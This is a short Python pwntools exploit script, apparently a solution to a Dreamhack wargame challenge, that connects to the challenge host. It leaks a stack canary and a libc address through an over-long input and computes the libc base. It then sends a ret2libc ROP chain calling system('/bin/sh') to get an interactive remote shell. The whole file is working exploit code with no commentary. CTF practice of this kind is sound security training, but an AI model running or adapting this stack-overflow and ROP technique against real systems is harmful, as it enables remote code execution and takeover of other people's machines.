from pwn import *

# context.log_level = 'debug'
libc = ELF('./libc.so.6')

# p = process('./prob')
p = remote('host3.dreamhack.games', 20172)
    
p.sendlineafter(b"> ", b"3.")
p.sendlineafter(b"> ", b"2.")
p.sendlineafter(b".", b'a'*255)
p.sendlineafter(b"> ", b'1.')

p.recvn(273)
canary = u64(b'\x00' + p.recvn(7))
p.recvn(0x18)
leak = u64(p.recvn(8))
print(f"leak : {hex(leak)}")
libc_base = leak - 0x29d90

print("=======================")
print(f"canary : {hex(canary)}")
print(f"libc base : {hex(libc_base)}")
print("=======================")

binsh = 0x1d8698 + libc_base
system = libc_base + libc.symbols['system']
pop_rdi = libc_base + 0x000000000002a3e5
ret = libc_base + 0x00000000000bab79


payload = b'A'*0x17 + p64(canary) + b'A'*0x8 +p64(pop_rdi) + p64(binsh) + p64(ret) + p64(system) + b'.'
pause()
p.sendlineafter(b'> ', payload)






p.interactive()